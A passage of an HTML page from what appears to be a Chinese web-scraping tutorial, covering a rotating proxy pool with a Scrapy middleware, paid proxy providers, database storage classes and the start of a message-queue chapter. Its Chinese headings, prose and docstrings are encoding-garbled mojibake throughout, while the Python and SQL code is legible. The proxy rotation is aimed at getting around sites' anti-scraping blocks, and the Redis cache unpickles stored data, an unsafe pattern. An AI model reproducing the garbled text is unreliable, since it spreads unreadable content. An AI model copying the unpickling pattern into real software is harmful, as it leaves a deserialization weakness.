                logger.info(f'Valid proxy: {proxy} ({response_time:.2f}s)')
                return True
        except:
            pass
        return False

    def batch_validate(self, proxies: List[str]):
        &quot;&quot;&quot;æ‰¹é‡éªŒè¯ä»£ç†&quot;&quot;&quot;
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(self.validate_proxy, proxies)

    def get_proxy(self) -&gt; str:
        &quot;&quot;&quot;è·å–æœ€å¿«çš„ä»£ç†&quot;&quot;&quot;
        result = self.r.zrange('proxy_pool', 0, 0)
        if result:
            return result[0]
        return None

    def get_random_proxy(self) -&gt; str:
        &quot;&quot;&quot;éšæœºè·å–ä»£ç†&quot;&quot;&quot;
        import random
        proxies = self.r.zrange('proxy_pool', 0, -1)
        if proxies:
            return random.choice(proxies)
        return None

    def remove_proxy(self, proxy: str):
        &quot;&quot;&quot;ç§»é™¤å¤±æ•ˆä»£ç†&quot;&quot;&quot;
        self.r.zrem('proxy_pool', proxy)
        logger.info(f'Removed proxy: {proxy}')

    def get_pool_size(self) -&gt; int:
        &quot;&quot;&quot;è·å–ä»£ç†æ± å¤§å°&quot;&quot;&quot;
        return self.r.zcard('proxy_pool')

    def run(self):
        &quot;&quot;&quot;è¿è¡Œä»£ç†æ± &quot;&quot;&quot;
        logger.info('Starting proxy pool...')
        while True:
            logger.info('Fetching proxies...')
            proxies = self.fetch_proxies()
            logger.info(f'Fetched {len(proxies)} proxies')

            logger.info('Validating proxies...')
            self.batch_validate(proxies)

            self.cleanup_old_proxies()

            pool_size = self.get_pool_size()
            logger.info(f'Current pool size: {pool_size}')

            time.sleep(300)

    def cleanup_old_proxies(self):
        &quot;&quot;&quot;æ¸…ç†å“åº”æ—¶é—´è¿‡é•¿çš„ä»£ç†&quot;&quot;&quot;
        self.r.zremrangebyscore('proxy_pool', 10, float('inf'))
</code></pre>
<hr />
<h2>ä½¿ç”¨ä»£ç†æ± </h2>
<h3>åŸºæœ¬ä½¿ç”¨</h3>
<pre><code class="language-python">def crawl_with_proxy(url):
    &quot;&quot;&quot;ä½¿ç”¨ä»£ç†çˆ¬å–&quot;&quot;&quot;
    pool = ProxyPool()
    max_retries = 3

    for i in range(max_retries):
        proxy = pool.get_proxy()
        if not proxy:
            logger.error('No available proxy!')
            break

        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

        try:
            response = requests.get(url, proxies=proxies, timeout=10)
            return response
        except Exception as e:
            logger.warning(f'Proxy {proxy} failed: {e}')
            pool.remove_proxy(proxy)

    return None
</code></pre>
<h3>ä¸ Scrapy é›†æˆ</h3>
<pre><code class="language-python"># middlewares.py
class ProxyMiddleware:
    def __init__(self):
        self.pool = ProxyPool()

    def process_request(self, request, spider):
        &quot;&quot;&quot;ä¸ºè¯·æ±‚è®¾ç½®ä»£ç†&quot;&quot;&quot;
        proxy = self.pool.get_proxy()
        if proxy:
            request.meta['proxy'] = f'http://{proxy}'
            spider.logger.info(f'Using proxy: {proxy}')

    def process_exception(self, request, exception, spider):
        &quot;&quot;&quot;å¤„ç†ä»£ç†å¤±è´¥&quot;&quot;&quot;
        proxy = request.meta.get('proxy', '').replace('http://', '')
        if proxy:
            self.pool.remove_proxy(proxy)
            spider.logger.warning(f'Removed failed proxy: {proxy}')
</code></pre>
<hr />
<h2>ä»˜è´¹ä»£ç†æœåŠ¡</h2>
<h3>æ¨èæœåŠ¡å•†</h3>
<table>
<thead>
<tr>
  <th>æœåŠ¡å•†</th>
  <th>ç±»å‹</th>
  <th>ä»·æ ¼</th>
  <th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Luminati (Bright Data)</strong></td>
  <td>ä½å®…ä»£ç†</td>
  <td>$500+/æœˆ</td>
  <td>è´¨é‡æœ€é«˜ï¼ŒIP æ± æœ€å¤§</td>
</tr>
<tr>
  <td><strong>Smartproxy</strong></td>
  <td>ä½å®…ä»£ç†</td>
  <td>$75+/æœˆ</td>
  <td>æ€§ä»·æ¯”é«˜</td>
</tr>
<tr>
  <td><strong>Oxylabs</strong></td>
  <td>æ•°æ®ä¸­å¿ƒ + ä½å®…</td>
  <td>$300+/æœˆ</td>
  <td>ç¨³å®šå¯é </td>
</tr>
<tr>
  <td><strong>ProxyMesh</strong></td>
  <td>æ•°æ®ä¸­å¿ƒ</td>
  <td>$10+/æœˆ</td>
  <td>ä¾¿å®œå…¥é—¨</td>
</tr>
<tr>
  <td><strong>ç«™å¤§çˆ·</strong></td>
  <td>æ•°æ®ä¸­å¿ƒ</td>
  <td>Â¥100+/æœˆ</td>
  <td>å›½å†…æœåŠ¡</td>
</tr>
</tbody>
</table>
<h3>API é›†æˆç¤ºä¾‹</h3>
<pre><code class="language-python">class LuminatiProxy:
    def __init__(self, username, password, port=22225):
        self.username = username
        self.password = password
        self.host = 'zproxy.lum-superproxy.io'
        self.port = port

    def get_proxy(self, country='us', session_id=None):
        &quot;&quot;&quot;è·å–ä»£ç†&quot;&quot;&quot;
        if session_id:
            username = f'{self.username}-country-{country}-session-{session_id}'
        else:
            username = f'{self.username}-country-{country}'

        proxy = f'http://{username}:{self.password}@{self.host}:{self.port}'
        return {'http': proxy, 'https': proxy}

# ä½¿ç”¨
proxy_provider = LuminatiProxy('your_username', 'your_password')
proxies = proxy_provider.get_proxy(country='us', session_id='12345')
response = requests.get(url, proxies=proxies)
</code></pre>
<hr />
<h2>ç›‘æ§ä¸ç»Ÿè®¡</h2>
<h3>ä»£ç†è´¨é‡è¯„åˆ†</h3>
<pre><code class="language-python">class ProxyScorer:
    def __init__(self):
        self.r = redis.Redis(decode_responses=True)

    def record_success(self, proxy):
        &quot;&quot;&quot;è®°å½•æˆåŠŸ&quot;&quot;&quot;
        self.r.hincrby(f'proxy:{proxy}', 'success', 1)
        self.update_score(proxy)

    def record_failure(self, proxy):
        &quot;&quot;&quot;è®°å½•å¤±è´¥&quot;&quot;&quot;
        self.r.hincrby(f'proxy:{proxy}', 'failure', 1)
        self.update_score(proxy)

    def update_score(self, proxy):
        &quot;&quot;&quot;æ›´æ–°è¯„åˆ†&quot;&quot;&quot;
        success = int(self.r.hget(f'proxy:{proxy}', 'success') or 0)
        failure = int(self.r.hget(f'proxy:{proxy}', 'failure') or 0)

        total = success + failure
        if total &gt; 0:
            score = success / total
            self.r.hset(f'proxy:{proxy}', 'score', score)

    def get_best_proxies(self, count=10):
        &quot;&quot;&quot;è·å–è¯„åˆ†æœ€é«˜çš„ä»£ç†&quot;&quot;&quot;
        all_proxies = self.r.keys('proxy:*')
        scored_proxies = []

        for key in all_proxies:
            proxy = key.replace('proxy:', '')
            score = float(self.r.hget(key, 'score') or 0)
            scored_proxies.append((proxy, score))

        scored_proxies.sort(key=lambda x: x[1], reverse=True)
        return scored_proxies[:count]
</code></pre>
<hr />
<h2>æœ€ä½³å®è·µ</h2>
<ol>
<li><strong>å®šæœŸéªŒè¯</strong>: æ¯ 5-10 åˆ†é’ŸéªŒè¯ä¸€æ¬¡ä»£ç†æ± </li>
<li><strong>å¿«é€Ÿå¤±è´¥</strong>: è®¾ç½®åˆç†çš„è¶…æ—¶æ—¶é—´ï¼ˆ3-5 ç§’ï¼‰</li>
<li><strong>è¯„åˆ†ç³»ç»Ÿ</strong>: æ ¹æ®æˆåŠŸç‡åŠ¨æ€è°ƒæ•´ä»£ç†æƒé‡</li>
<li><strong>æ··åˆä½¿ç”¨</strong>: å…è´¹ä»£ç† + ä»˜è´¹ä»£ç†ç»„åˆ</li>
<li><strong>åœ°åŸŸåˆ†é…</strong>: æ ¹æ®ç›®æ ‡ç½‘ç«™é€‰æ‹©å¯¹åº”åœ°åŒºä»£ç†</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-51">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
<li><a href="#section-37">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
<li><a href="#section-56">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-53">
                                                <h2>[R52] Data Storage Solutions</h2>
                                                <h1>R52: æ•°æ®å­˜å‚¨æ–¹æ¡ˆ</h1>
<h2>æ¦‚è¿°</h2>
<p>çˆ¬è™«ç³»ç»Ÿéœ€è¦é«˜æ•ˆçš„æ•°æ®å­˜å‚¨æ–¹æ¡ˆæ¥å¤„ç†æµ·é‡æ•°æ®ã€‚æœ¬ç« ä»‹ç»å¸¸è§çš„å­˜å‚¨é€‰å‹å’Œæœ€ä½³å®è·µã€‚</p>
<hr />
<h2>å­˜å‚¨é€‰å‹</h2>
<h3>å…³ç³»å‹æ•°æ®åº“ vs NoSQL</h3>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>å…³ç³»å‹æ•°æ®åº“</th>
  <th>NoSQL</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ•°æ®æ¨¡å‹</strong></td>
  <td>è¡¨æ ¼ã€ä¸¥æ ¼ schema</td>
  <td>æ–‡æ¡£ã€é”®å€¼ã€åˆ—æ—</td>
</tr>
<tr>
  <td><strong>æ‰©å±•æ€§</strong></td>
  <td>å‚ç›´æ‰©å±•</td>
  <td>æ°´å¹³æ‰©å±•</td>
</tr>
<tr>
  <td><strong>äº‹åŠ¡æ”¯æŒ</strong></td>
  <td>ACID å®Œæ•´æ”¯æŒ</td>
  <td>éƒ¨åˆ†æ”¯æŒ</td>
</tr>
<tr>
  <td><strong>æŸ¥è¯¢èƒ½åŠ›</strong></td>
  <td>å¼ºå¤§çš„ SQL</td>
  <td>å—é™çš„æŸ¥è¯¢è¯­è¨€</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>ç»“æ„åŒ–æ•°æ®ã€å¤æ‚å…³è”</td>
  <td>æµ·é‡æ•°æ®ã€é«˜å¹¶å‘å†™å…¥</td>
</tr>
</tbody>
</table>
<hr />
<h2>MySQL</h2>
<h3>é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>ç»“æ„åŒ–æ•°æ®å­˜å‚¨</li>
<li>éœ€è¦å¤æ‚å…³è”æŸ¥è¯¢</li>
<li>äº‹åŠ¡è¦æ±‚é«˜</li>
<li>æ•°æ®é‡åœ¨åƒä¸‡çº§ä»¥ä¸‹</li>
</ul>
<h3>è¡¨è®¾è®¡ç¤ºä¾‹</h3>
<pre><code class="language-sql">-- ç”¨æˆ·è¡¨
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- æ–‡ç« è¡¨
CREATE TABLE articles (
    id INT PRIMARY KEY AUTO_INCREMENT,
    user_id INT NOT NULL,
    title VARCHAR(200) NOT NULL,
    content TEXT,
    view_count INT DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id),
    INDEX idx_user_id (user_id),
    INDEX idx_created_at (created_at),
    FULLTEXT INDEX idx_content (title, content)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
</code></pre>
<h3>Python æ“ä½œç¤ºä¾‹</h3>
<pre><code class="language-python">import pymysql
from dbutils.pooled_db import PooledDB

class MySQLStorage:
    def __init__(self, host='localhost', port=3306, user='root',
                 password='', database='scraper'):
        self.pool = PooledDB(
            creator=pymysql,
            maxconnections=20,
            mincached=2,
            maxcached=5,
            host=host,
            port=port,
            user=user,
            password=password,
            database=database,
            charset='utf8mb4',
            cursorclass=pymysql.cursors.DictCursor
        )

    def insert_article(self, article):
        &quot;&quot;&quot;æ’å…¥æ–‡ç« &quot;&quot;&quot;
        conn = self.pool.connection()
        try:
            with conn.cursor() as cursor:
                sql = &quot;&quot;&quot;
                INSERT INTO articles (user_id, title, content, view_count)
                VALUES (%(user_id)s, %(title)s, %(content)s, %(view_count)s)
                &quot;&quot;&quot;
                cursor.execute(sql, article)
                conn.commit()
                return cursor.lastrowid
        finally:
            conn.close()

    def batch_insert(self, articles):
        &quot;&quot;&quot;æ‰¹é‡æ’å…¥&quot;&quot;&quot;
        conn = self.pool.connection()
        try:
            with conn.cursor() as cursor:
                sql = &quot;&quot;&quot;
                INSERT INTO articles (user_id, title, content)
                VALUES (%(user_id)s, %(title)s, %(content)s)
                &quot;&quot;&quot;
                cursor.executemany(sql, articles)
                conn.commit()
        finally:
            conn.close()

    def query_by_user(self, user_id, limit=10):
        &quot;&quot;&quot;æŸ¥è¯¢ç”¨æˆ·æ–‡ç« &quot;&quot;&quot;
        conn = self.pool.connection()
        try:
            with conn.cursor() as cursor:
                sql = &quot;&quot;&quot;
                SELECT * FROM articles
                WHERE user_id = %s
                ORDER BY created_at DESC
                LIMIT %s
                &quot;&quot;&quot;
                cursor.execute(sql, (user_id, limit))
                return cursor.fetchall()
        finally:
            conn.close()
</code></pre>
<hr />
<h2>MongoDB</h2>
<h3>é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>åŠç»“æ„åŒ–æ•°æ®</li>
<li>Schema ç»å¸¸å˜åŠ¨</li>
<li>éœ€è¦æ°´å¹³æ‰©å±•</li>
<li>è¯»å†™æ€§èƒ½è¦æ±‚é«˜</li>
</ul>
<h3>æ–‡æ¡£è®¾è®¡ç¤ºä¾‹</h3>
<pre><code class="language-javascript">// ç”¨æˆ·æ–‡æ¡£
{
  &quot;_id&quot;: ObjectId(&quot;507f1f77bcf86cd799439011&quot;),
  &quot;username&quot;: &quot;john_doe&quot;,
  &quot;email&quot;: &quot;john@example.com&quot;,
  &quot;profile&quot;: {
    &quot;age&quot;: 30,
    &quot;location&quot;: &quot;Beijing&quot;
  },
  &quot;tags&quot;: [&quot;tech&quot;, &quot;science&quot;],
  &quot;created_at&quot;: ISODate(&quot;2024-01-01T00:00:00Z&quot;)
}

// æ–‡ç« æ–‡æ¡£
{
  &quot;_id&quot;: ObjectId(&quot;507f191e810c19729de860ea&quot;),
  &quot;user_id&quot;: ObjectId(&quot;507f1f77bcf86cd799439011&quot;),
  &quot;title&quot;: &quot;Web é€†å‘å…¥é—¨&quot;,
  &quot;content&quot;: &quot;...&quot;,
  &quot;tags&quot;: [&quot;é€†å‘&quot;, &quot;çˆ¬è™«&quot;],
  &quot;stats&quot;: {
    &quot;views&quot;: 1000,
    &quot;likes&quot;: 50
  },
  &quot;comments&quot;: [
    {
      &quot;user&quot;: &quot;alice&quot;,
      &quot;text&quot;: &quot;Great article!&quot;,
      &quot;date&quot;: ISODate(&quot;2024-01-02T00:00:00Z&quot;)
    }
  ],
  &quot;created_at&quot;: ISODate(&quot;2024-01-01T00:00:00Z&quot;)
}
</code></pre>
<h3>Python æ“ä½œç¤ºä¾‹</h3>
<pre><code class="language-python">from pymongo import MongoClient, ASCENDING, DESCENDING
from datetime import datetime

class MongoStorage:
    def __init__(self, uri='mongodb://localhost:27017/', db_name='scraper'):
        self.client = MongoClient(uri)
        self.db = self.client[db_name]
        self.articles = self.db.articles

        # åˆ›å»ºç´¢å¼•
        self.articles.create_index([('user_id', ASCENDING)])
        self.articles.create_index([('created_at', DESCENDING)])
        self.articles.create_index([('title', 'text'), ('content', 'text')])

    def insert_article(self, article):
        &quot;&quot;&quot;æ’å…¥æ–‡ç« &quot;&quot;&quot;
        article['created_at'] = datetime.now()
        result = self.articles.insert_one(article)
        return result.inserted_id

    def batch_insert(self, articles):
        &quot;&quot;&quot;æ‰¹é‡æ’å…¥&quot;&quot;&quot;
        for article in articles:
            article['created_at'] = datetime.now()
        result = self.articles.insert_many(articles)
        return result.inserted_ids

    def find_by_user(self, user_id, limit=10):
        &quot;&quot;&quot;æŸ¥è¯¢ç”¨æˆ·æ–‡ç« &quot;&quot;&quot;
        cursor = self.articles.find(
            {'user_id': user_id}
        ).sort('created_at', DESCENDING).limit(limit)
        return list(cursor)

    def update_views(self, article_id):
        &quot;&quot;&quot;æ›´æ–°æµè§ˆé‡&quot;&quot;&quot;
        self.articles.update_one(
            {'_id': article_id},
            {'$inc': {'stats.views': 1}}
        )

    def text_search(self, keyword):
        &quot;&quot;&quot;å…¨æ–‡æœç´¢&quot;&quot;&quot;
        cursor = self.articles.find(
            {'$text': {'$search': keyword}}
        ).limit(20)
        return list(cursor)

    def aggregate_stats(self):
        &quot;&quot;&quot;èšåˆç»Ÿè®¡&quot;&quot;&quot;
        pipeline = [
            {'$group': {
                '_id': '$user_id',
                'total_articles': {'$sum': 1},
                'total_views': {'$sum': '$stats.views'}
            }},
            {'$sort': {'total_views': -1}},
            {'$limit': 10}
        ]
        return list(self.articles.aggregate(pipeline))
</code></pre>
<hr />
<h2>Redis</h2>
<h3>é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>ç¼“å­˜çƒ­ç‚¹æ•°æ®</li>
<li>åˆ†å¸ƒå¼é”</li>
<li>æ¶ˆæ¯é˜Ÿåˆ—</li>
<li>è®¡æ•°å™¨ã€æ’è¡Œæ¦œ</li>
<li>Session å­˜å‚¨</li>
</ul>
<h3>ä½¿ç”¨ç¤ºä¾‹</h3>
<pre><code class="language-python">import redis
import json
import pickle
from functools import wraps

class RedisStorage:
    def __init__(self, host='localhost', port=6379, db=0):
        self.r = redis.Redis(host=host, port=port, db=db, decode_responses=False)

    def cache_result(self, key, data, expire=3600):
        &quot;&quot;&quot;ç¼“å­˜æ•°æ®&quot;&quot;&quot;
        self.r.setex(key, expire, pickle.dumps(data))

    def get_cache(self, key):
        &quot;&quot;&quot;è·å–ç¼“å­˜&quot;&quot;&quot;
        data = self.r.get(key)
        if data:
            return pickle.loads(data)
        return None

    def cache_decorator(self, expire=3600):
        &quot;&quot;&quot;ç¼“å­˜è£…é¥°å™¨&quot;&quot;&quot;
        def decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):
                cache_key = f&quot;{func.__name__}:{args}:{kwargs}&quot;
                result = self.get_cache(cache_key)
                if result is not None:
                    return result

                result = func(*args, **kwargs)
                self.cache_result(cache_key, result, expire)
                return result
            return wrapper
        return decorator

    def incr_counter(self, key):
        &quot;&quot;&quot;è®¡æ•°å™¨&quot;&quot;&quot;
        return self.r.incr(key)

    def add_to_set(self, key, *values):
        &quot;&quot;&quot;æ·»åŠ åˆ°é›†åˆ&quot;&quot;&quot;
        return self.r.sadd(key, *values)

    def is_crawled(self, url):
        &quot;&quot;&quot;æ£€æŸ¥ URL æ˜¯å¦å·²çˆ¬å–&quot;&quot;&quot;
        return self.r.sismember('crawled_urls', url)

    def mark_as_crawled(self, url):
        &quot;&quot;&quot;æ ‡è®° URL å·²çˆ¬å–&quot;&quot;&quot;
        self.r.sadd('crawled_urls', url)

    def add_to_queue(self, queue_name, item):
        &quot;&quot;&quot;æ·»åŠ åˆ°é˜Ÿåˆ—&quot;&quot;&quot;
        self.r.lpush(queue_name, json.dumps(item))

    def get_from_queue(self, queue_name, timeout=0):
        &quot;&quot;&quot;ä»é˜Ÿåˆ—è·å–&quot;&quot;&quot;
        result = self.r.brpop(queue_name, timeout=timeout)
        if result:
            return json.loads(result[1])
        return None

    def sorted_set_add(self, key, score, member):
        &quot;&quot;&quot;æ·»åŠ åˆ°æœ‰åºé›†åˆ&quot;&quot;&quot;
        self.r.zadd(key, {member: score})

    def get_top_n(self, key, n=10):
        &quot;&quot;&quot;è·å–æ’è¡Œæ¦œå‰ N å&quot;&quot;&quot;
        return self.r.zrevrange(key, 0, n-1, withscores=True)
</code></pre>
<hr />
<h2>Elasticsearch</h2>
<h3>é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>å…¨æ–‡æœç´¢</li>
<li>æ—¥å¿—åˆ†æ</li>
<li>å®æ—¶æ•°æ®åˆ†æ</li>
<li>å¤§è§„æ¨¡æ•°æ®æ£€ç´¢</li>
</ul>
<h3>ç´¢å¼•è®¾è®¡ç¤ºä¾‹</h3>
<pre><code class="language-python">from elasticsearch import Elasticsearch
from datetime import datetime

class ElasticsearchStorage:
    def __init__(self, hosts=['localhost:9200']):
        self.es = Elasticsearch(hosts)
        self.index_name = 'articles'
        self._create_index()

    def _create_index(self):
        &quot;&quot;&quot;åˆ›å»ºç´¢å¼•&quot;&quot;&quot;
        if not self.es.indices.exists(index=self.index_name):
            mapping = {
                'mappings': {
                    'properties': {
                        'title': {
                            'type': 'text',
                            'analyzer': 'ik_max_word',
                            'search_analyzer': 'ik_smart'
                        },
                        'content': {
                            'type': 'text',
                            'analyzer': 'ik_max_word'
                        },
                        'author': {
                            'type': 'keyword'
                        },
                        'tags': {
                            'type': 'keyword'
                        },
                        'created_at': {
                            'type': 'date'
                        },
                        'view_count': {
                            'type': 'integer'
                        }
                    }
                }
            }
            self.es.indices.create(index=self.index_name, body=mapping)

    def index_document(self, doc_id, document):
        &quot;&quot;&quot;ç´¢å¼•æ–‡æ¡£&quot;&quot;&quot;
        document['created_at'] = datetime.now()
        return self.es.index(
            index=self.index_name,
            id=doc_id,
            body=document
        )

    def bulk_index(self, documents):
        &quot;&quot;&quot;æ‰¹é‡ç´¢å¼•&quot;&quot;&quot;
        from elasticsearch.helpers import bulk

        actions = [
            {
                '_index': self.index_name,
                '_id': doc['id'],
                '_source': doc
            }
            for doc in documents
        ]
        return bulk(self.es, actions)

    def search(self, query, size=10):
        &quot;&quot;&quot;æœç´¢&quot;&quot;&quot;
        body = {
            'query': {
                'multi_match': {
                    'query': query,
                    'fields': ['title^2', 'content']
                }
            },
            'highlight': {
                'fields': {
                    'title': {},
                    'content': {}
                }
            },
            'size': size
        }
        return self.es.search(index=self.index_name, body=body)

    def search_by_tags(self, tags, size=10):
        &quot;&quot;&quot;æŒ‰æ ‡ç­¾æœç´¢&quot;&quot;&quot;
        body = {
            'query': {
                'terms': {
                    'tags': tags
                }
            },
            'size': size
        }
        return self.es.search(index=self.index_name, body=body)

    def aggregate_by_author(self):
        &quot;&quot;&quot;æŒ‰ä½œè€…èšåˆ&quot;&quot;&quot;
        body = {
            'size': 0,
            'aggs': {
                'authors': {
                    'terms': {
                        'field': 'author',
                        'size': 10
                    },
                    'aggs': {
                        'avg_views': {
                            'avg': {
                                'field': 'view_count'
                            }
                        }
                    }
                }
            }
        }
        return self.es.search(index=self.index_name, body=body)
</code></pre>
<hr />
<h2>æ··åˆå­˜å‚¨æ–¹æ¡ˆ</h2>
<h3>å…¸å‹æ¶æ„</h3>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚          Application Layer          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚                    â”‚
    â–¼                    â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Redis  â”‚        â”‚  MySQL   â”‚
â”‚ (Cache) â”‚        â”‚ (Master) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
                        â”‚
              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
              â”‚                   â”‚
              â–¼                   â–¼
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚ MongoDB  â”‚        â”‚    ES    â”‚
        â”‚(æ–‡æ¡£å­˜å‚¨) â”‚        â”‚(å…¨æ–‡æœç´¢) â”‚
        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3>å®ç°ç¤ºä¾‹</h3>
<pre><code class="language-python">class HybridStorage:
    def __init__(self):
        self.redis = RedisStorage()
        self.mysql = MySQLStorage()
        self.mongo = MongoStorage()
        self.es = ElasticsearchStorage()

    def save_article(self, article):
        &quot;&quot;&quot;ä¿å­˜æ–‡ç« ï¼ˆå¤šå­˜å‚¨ï¼‰&quot;&quot;&quot;
        # 1. MySQL å­˜å‚¨åŸºæœ¬ä¿¡æ¯
        article_id = self.mysql.insert_article({
            'user_id': article['user_id'],
            'title': article['title'],
            'created_at': article['created_at']
        })

        # 2. MongoDB å­˜å‚¨å®Œæ•´æ–‡æ¡£
        article['_id'] = article_id
        self.mongo.insert_article(article)

        # 3. Elasticsearch ç´¢å¼•ï¼ˆç”¨äºæœç´¢ï¼‰
        self.es.index_document(article_id, article)

        # 4. Redis ç¼“å­˜çƒ­ç‚¹æ•°æ®
        cache_key = f&quot;article:{article_id}&quot;
        self.redis.cache_result(cache_key, article, expire=3600)

        return article_id

    def get_article(self, article_id):
        &quot;&quot;&quot;è·å–æ–‡ç« ï¼ˆç¼“å­˜ä¼˜å…ˆï¼‰&quot;&quot;&quot;
        # 1. å…ˆæŸ¥ Redis ç¼“å­˜
        cache_key = f&quot;article:{article_id}&quot;
        cached = self.redis.get_cache(cache_key)
        if cached:
            return cached

        # 2. æŸ¥ MongoDB
        article = self.mongo.articles.find_one({'_id': article_id})
        if article:
            # å›å†™ç¼“å­˜
            self.redis.cache_result(cache_key, article, expire=3600)
            return article

        return None

    def search_articles(self, keyword):
        &quot;&quot;&quot;æœç´¢æ–‡ç« ï¼ˆä½¿ç”¨ ESï¼‰&quot;&quot;&quot;
        return self.es.search(keyword)
</code></pre>
<hr />
<h2>æ€§èƒ½ä¼˜åŒ–</h2>
<h3>1. æ‰¹é‡æ“ä½œ</h3>
<pre><code class="language-python"># æ‰¹é‡æ’å…¥
def batch_insert_optimized(articles, batch_size=1000):
    for i in range(0, len(articles), batch_size):
        batch = articles[i:i+batch_size]
        storage.batch_insert(batch)
</code></pre>
<h3>2. è¿æ¥æ± </h3>
<pre><code class="language-python"># ä½¿ç”¨è¿æ¥æ± é¿å…é¢‘ç¹åˆ›å»ºè¿æ¥
from dbutils.pooled_db import PooledDB

pool = PooledDB(
    creator=pymysql,
    maxconnections=20,
    mincached=2,
    blocking=True
)
</code></pre>
<h3>3. ç´¢å¼•ä¼˜åŒ–</h3>
<pre><code class="language-sql">-- åˆ›å»ºåˆé€‚çš„ç´¢å¼•
CREATE INDEX idx_user_created ON articles(user_id, created_at);

-- åˆ†ææŸ¥è¯¢æ€§èƒ½
EXPLAIN SELECT * FROM articles WHERE user_id = 123;
</code></pre>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-51">åˆ†å¸ƒå¼çˆ¬è™«æ¶æ„</a></li>
<li><a href="#section-56">ç›‘æ§ä¸å‘Šè­¦ç³»ç»Ÿ</a></li>
<li><a href="#section-55">Docker å®¹å™¨åŒ–éƒ¨ç½²</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-54">
                                                <h2>[R53] Message Queue Application</h2>
                                                <h1>R53: æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨</h1>
<h2>æ¦‚è¿°</h2>
<p>æ¶ˆæ¯é˜Ÿåˆ—æ˜¯åˆ†å¸ƒå¼çˆ¬è™«ç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œç”¨äºè§£è€¦ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ã€å‰Šå³°å¡«è°·ã€å¼‚æ­¥å¤„ç†ã€‚æœ¬ç« ä»‹ç»å¸¸è§æ¶ˆæ¯é˜Ÿåˆ—çš„ä½¿ç”¨ã€‚</p>
<hr />
<h2>æ¶ˆæ¯é˜Ÿåˆ—å¯¹æ¯”</h2>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>RabbitMQ</th>
  <th>Kafka</th>
  <th>Redis</th>
  <th>Celery</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ€§èƒ½</strong></td>
  <td>ä¸­ç­‰</td>
  <td>æé«˜</td>
  <td>é«˜</td>
  <td>ä¸­ç­‰</td>
</tr>
<tr>
  <td><strong>å¯é æ€§</strong></td>
  <td>é«˜</td>
  <td>é«˜</td>
  <td>ä¸­</td>
  <td>ä¸­</td>
</tr>
<tr>
  <td><strong>æ¶ˆæ¯é¡ºåº</strong></td>
  <td>æ”¯æŒ</td>
  <td>å¼ºä¿è¯</td>
  <td>ä¸ä¿è¯</td>
  <td>ä¸ä¿è¯</td>
</tr>
<tr>
  <td><strong>æŒä¹…åŒ–</strong></td>
  <td>æ”¯æŒ</td>
  <td>æ”¯æŒ</td>
  <td>å¯é€‰</td>
  <td>ä¾èµ– Broker</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>é€šç”¨æ¶ˆæ¯é˜Ÿåˆ—</td>
  <td>æ—¥å¿—æ”¶é›†ã€æµå¤„ç†</td>
  <td>è½»é‡çº§é˜Ÿåˆ—</td>
  <td>å¼‚æ­¥ä»»åŠ¡</td>
</tr>
</tbody>
</table>
<hr />
<h2>RabbitMQ</h2>
<h3>åŸºæœ¬æ¦‚å¿µ</h3>
<ul>
